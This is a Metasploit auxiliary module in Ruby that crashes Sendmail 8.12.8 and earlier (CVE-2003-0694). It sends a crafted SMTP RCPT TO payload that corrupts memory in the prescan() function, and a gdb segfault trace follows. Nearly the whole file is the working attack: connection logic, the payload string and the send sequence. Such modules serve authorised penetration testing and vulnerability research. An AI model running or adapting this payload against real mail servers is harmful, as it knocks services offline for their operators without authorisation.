##
# $Id: sendmail_prescan.rb 7031 2009-09-12 10:56:36Z patrickw $
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Exploit::Remote::Smtp
	include Msf::Auxiliary::Dos

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Sendmail SMTP Address prescan <= 8.12.8 Memory Corruption',
			'Description'    => %q{
				This is a proof of concept denial of service module for Sendmail versions
				8.12.8 and earlier. The vulnerability is within the prescan() method when
				parsing SMTP headers. Due to the prescan function, only 0x5c and 0x00
				bytes can be used, limiting the likelihood for arbitrary code execution.
			},
			'Author'         => [ 'patrick' ],
			'Version'        => '$Revision: 7031 $',
			'References'     =>
				[
					[ 'OSVDB', '2577' ],
					[ 'CVE', '2003-0694' ],
					[ 'BID', '8641' ],
					[ 'URL', 'http://www.milw0rm.com/exploits/24' ],
				],
			'DisclosureDate' => 'Sep 17 2003'))
	end

	def run
		begin
			connect
			# we use connect instead of connect_login,
			# because we send our own malicious RCPT.
			# however we want to make use of MAILFROM
			# and raw_send_recv()
			#sleep(23) # so we can attach gdb to the child PID

			sploit = ("A" * 255 + ";") * 4 + "A" * 217 + ";" + "\x5c\xff" * 28

			raw_send_recv("EHLO X\r\n")
			raw_send_recv("MAIL FROM: #{datastore['MAILFROM']}\r\n")
			print_status("Sending DoS packet.")
			raw_send_recv("RCPT TO: #{sploit}\r\n")

			disconnect
		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
			print_status("Couldn't connect to #{rhost}:#{rport}")
		rescue ::EOFError
			print_status("Sendmail stopped responding after sending trigger - target vulnerable.")
		end

	end

end

=begin
Program received signal SIGSEGV, Segmentation fault.
0x8073499 in ?? ()
(gdb) bt
#0   0x807e499 in ?? ()
#1   0x087e125 in ?? ()
#2   0x5c5c5c5c in ?? ()
Error accessing memory address 0x5c5c5c5c: Bad address.
=end
